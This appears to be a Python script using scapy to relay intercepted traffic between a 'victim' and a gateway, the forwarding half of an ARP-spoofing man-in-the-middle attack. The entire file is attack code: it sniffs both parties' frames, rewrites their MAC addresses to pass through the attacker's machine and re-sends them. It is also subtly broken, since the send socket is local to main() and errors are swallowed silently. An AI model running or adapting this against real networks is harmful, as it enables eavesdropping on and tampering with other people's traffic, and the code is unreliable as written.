import sys
import validation

sys_path, victim_mac, victim_ip, gateway_mac, gateway_ip, interface, attacker_mac = validation.read_config('config.txt')

if validation.validate_sys_path(sys_path):
    sys.path.append(sys_path)
else:
    print("Invalid sys_path")
    sys.exit(1) 

from scapy.all import *

_SRC_DST = {
    gateway_mac: victim_mac,
    victim_mac: gateway_mac,
}
 
def forward_pkt(pkt):
    """
    Modify and forward a packet.

    Args:
        pkt: packet to be forwarded.
    """
    pkt[Ether].dst = _SRC_DST.get(pkt[Ether].src, gateway_mac)
    pkt[Ether].src = attacker_mac   
    try:
        frags=fragment(pkt,fragsize=1400) 
        for frg in frags:                    
            s.send(frg)              
    except:
        try:                          
            s.send(Ether(pkt))
        except:
            pass
    
def main():
    """
    Main function to perform ARP forwarding.
    """
    if (
        not validation.validate_mac(victim_mac) 
        or not validation.validate_ip(victim_ip) 
        or not validation.validate_mac(gateway_mac) 
        or not validation.validate_ip(gateway_ip) 
        or not validation.validate_mac(attacker_mac)
    ):
        print("Invalid parameters in config file")
        return
        
    try:  
        s = conf.L2socket(iface=interface)    # Precreate the layer 2 socket to reuse it
        conf.layers.filter([Ether])           # Filter for Ethernet and IP layers when sniffing
        sniff(iface=interface, prn=forward_pkt, filter="ether src %s or ether src %s" % (victim_mac, gateway_mac))
    except KeyboardInterrupt:
        print("ARP forwarding stopped")

if __name__ == "__main__":
    main()
    
    
